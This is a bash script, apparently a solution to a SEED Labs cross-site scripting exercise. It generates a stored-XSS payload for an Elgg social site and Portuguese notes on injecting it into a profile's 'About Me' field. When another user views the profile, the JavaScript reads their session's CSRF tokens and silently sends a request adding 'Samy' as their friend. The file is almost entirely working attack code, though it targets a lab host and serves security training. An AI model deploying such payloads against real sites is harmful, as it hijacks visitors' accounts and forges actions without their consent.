#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SAMY_GUID="${1:-59}"

cat > "$SCRIPT_DIR/task4_add_friend.html" <<EOF
<script type="text/javascript">
window.onload = function () {
  var samyGuid = ${SAMY_GUID};
  var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
  var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
  var sendurl = "http://www.seed-server.com/action/friends/add?friend=" + samyGuid + ts + token;

  if (elgg.session.user.guid != samyGuid) {
    var ajax = new XMLHttpRequest();
    ajax.open("GET", sendurl, true);
    ajax.send();
  }
};
</script>
EOF

cat > "$SCRIPT_DIR/task4_notas.txt" <<EOF
Task 4 - Add Friend Worm

GUID assumido para o Samy: ${SAMY_GUID}

Pedido esperado:
- URL base: http://www.seed-server.com/action/friends/add
- Metodo: GET
- Parametro principal: friend=${SAMY_GUID}
- Parametros obrigatorios: __elgg_ts e __elgg_token

Local de injecao:
- Campo "About Me" do utilizador Samy
- Usar modo Text/HTML

Se o GUID do Samy no teu lab nao for ${SAMY_GUID}, captura um pedido legitimo
de add-friend nas DevTools e volta a gerar este ficheiro com:
./sec3.sh <guid_certo>
EOF

printf 'Gerados: task4_add_friend.html, task4_notas.txt\n'
printf 'GUID do Samy assumido: %s\n' "$SAMY_GUID"

# Testes/uso:
# - Colar task4_add_friend.html no About Me do Samy em modo Text
# - Visitar a pagina com outra conta
# - Esperado: a vitima adiciona o Samy como amigo automaticamente
